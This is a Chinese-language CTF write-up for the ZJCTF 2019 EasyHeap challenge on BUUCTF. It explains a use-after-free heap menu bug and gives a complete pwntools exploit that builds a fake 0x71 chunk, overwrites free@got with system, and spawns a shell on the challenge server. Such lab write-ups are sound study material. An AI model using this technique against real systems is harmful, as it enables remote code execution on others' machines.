---
title: Buuctf 刷题记录 - ZJCTF 2019 EasyHeap
contest: ZJCTF
year: 2019
difficulty: medium
vuln_type: heap
tags: [heap 菜单 1/2/3/4/4869, magic 全局, 0x6020c0, free 没清指针, 0x71 fake chunk, heaparray 0x6020e0, got 表覆写, fill 改 free.got → system, 0x6020ad fd 链]
attack_chain:
  - 菜单 1: create_heap, size 0x60 + content 'aaa'
  - 菜单 2: edit_heap, 改 index 0 内容 0x68 'a' + p64(0x71) + p64(0x6020ad)
  - free index 1 → 0x71 fastbin → 0x6020ad (unsorted bin fd 偏 0x23)
  - 菜单 1: '/bin/sh\x00' 占 index 1 → content 是 /bin/sh 字符串
  - 菜单 1: 0x23 'a' + p64(free.got) 占 index 2 → heaparray 落 free.got
  - 菜单 2: fill index 2 → 写 p64(system.plt) 到 free.got
  - free index 1 → 触发 system("/bin/sh")
key_payload: 'free 没清指针 / 0x71 fake chunk / 0x6020ad 偏 0x23 / 0x23 字节对齐 + p64(free.got) / fill 改 free.got → system / free("/bin/sh")'
one_liner: ZJCTF 2019 EasyHeap — 堆菜单 free 没清指针 + 0x71 fake chunk + 0x6020ad fd 偏 0x23 字节对齐 + heaparray 落 free.got + fill 改 free.got→system 触发 system("/bin/sh")。
lesson: 堆菜单 free 不清指针 + 利用 unsorted bin fd 偏 0x23 字节对齐 0x6020XX 是经典 trick;fill 改 got 表 (free→system) 是最终利用。
quality: high
---

# Buuctf 刷题记录 - ZJCTF 2019 EasyHeap

## 速读
ZJCTF 2019 EasyHeap — 经典堆菜单题,利用 free 不清指针 + 0x71 fake chunk + 0x6020ad fd 偏 0x23。

## 漏洞
- 菜单 1/2/3/4/4869
- magic 全局 (0x6020c0), > 0x1305 触发 l33t() = `system("cat /home/pwn/flag")`
- create_heap / edit_heap / delete_heap
- free 没清指针

## EXP
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = remote("node5.buuoj.cn", 28812)
elf = ELF("./easyheap")

def allocate(size, payload):
    io.recvuntil(b"Your choice :")
    io.send(b'1')
    io.recvuntil(b"Size of Heap : ")
    io.send(str(size).encode())
    io.recvuntil(b"Content of heap:")
    io.send(payload)

def fill(index, payload):
    io.recvuntil(b"Your choice :")
    io.send(b'2')
    io.recvuntil(b"Index :")
    io.send(str(index).encode())
    io.recvuntil(b"Size of Heap : ")
    io.send(str(len(payload)).encode())
    io.recvuntil(b"Content of heap : ")
    io.send(payload)

def free(index):
    io.recvuntil(b"Your choice :")
    io.send(b'3')
    io.recvuntil(b"Index :")
    io.send(str(index).encode())

allocate(0x60, b'aaa')
allocate(0x60, b'aaa')
free(1)
# magic = 0x6020c0, fill chunk 0 size 0x68
payload = b'a' * 0x68 + p64(0x71) + p64(0x6020ad)  # unsorted bin fd 偏 0x23
fill(0, payload)
# 申请回 index 1 = /bin/sh, index 2 = 0x23字节 + free.got
allocate(0x60, b'/bin/sh\x00')
payload = b'a' * 0x23 + p64(elf.got["free"])
allocate(0x60, payload)
# fill index 2 → free.got = system
payload = p64(elf.plt["system"])
fill(2, payload)
free(1)  # 触发 system("/bin/sh")
io.interactive()
```

## 关键
- `0x6020ad = heaparray - 0x33` (0x23 字节对齐)
- 利用 unsorted bin fd 偏 0x23 字节
- fill 改 free.got → system 是 RCE
